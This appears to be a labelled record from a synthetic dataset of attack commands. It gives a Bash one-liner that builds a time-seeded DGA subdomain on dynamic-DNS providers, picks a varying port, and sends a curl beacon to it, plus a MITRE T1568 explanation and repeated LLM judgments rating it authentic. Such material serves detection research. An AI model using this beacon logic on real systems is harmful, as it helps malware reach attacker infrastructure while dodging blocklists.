command:
seed="$(date -u +%Y%m%d%H%M%S)"; sub=$(echo -n "$seed" | sha256sum | cut -c1-15); tld=$(printf "ddns.net
dynu.net
duckdns.org
no-ip.org" | awk "NR==$(($(date -u +%S)%4+1))"); dom="$sub.$tld"; port=$(( 2000 + ($(date -u +%s) % 45000) )); curl --max-time 5 --connect-timeout 5 "https://$dom:$port/v1/check"
explanation: Produces a per-second DGA subdomain and selects a provider TLD by current seconds, with a wide dynamic port range. This is dynamic resolution in line with T1568.
rationale_steps: Use current UTC timestamp to seed a DGA hash.
Choose a provider TLD based on the current second.
Compute a variable port from epoch seconds.
Attempt a curl request to the dynamic endpoint.

llm_judgments.syntactic_justification: Balanced quoting and separators with valid pipelines, command and arithmetic substitutions, and correct curl flags make it well-formed in Bash.
llm_judgments.semantic_justification: It deterministically generates time-based DGA subdomains, rotates among dynamic-DNS TLDs and ports, and attempts an HTTPS beacon, matching T1568 dynamic resolution behavior.

llm_judgments.syntactic_justification: The command is well-formed with balanced quotes, proper semicolons as separators, valid arithmetic expansions, correct awk quoting, and valid curl flags throughout.
llm_judgments.semantic_justification: The command authentically implements T1568 dynamic resolution by generating a time-seeded SHA256-based subdomain, algorithmically selecting a DDNS TLD via seconds modulo, computing a dynamic port from epoch time, and beaconing to the resulting endpoint via curl — all hallmarks of DGA-style C2 behavior.

llm_judgments.syntactic_justification: The command uses valid Bash syntax, correctly handles variable assignments, arithmetic expansions, and command pipelines without any quoting or structural errors.
llm_judgments.semantic_justification: The command perfectly demonstrates the logic of a Domain Generation Algorithm (DGA) by dynamically generating subdomains, selecting TLDs, and varying ports at runtime to avoid static indicators.
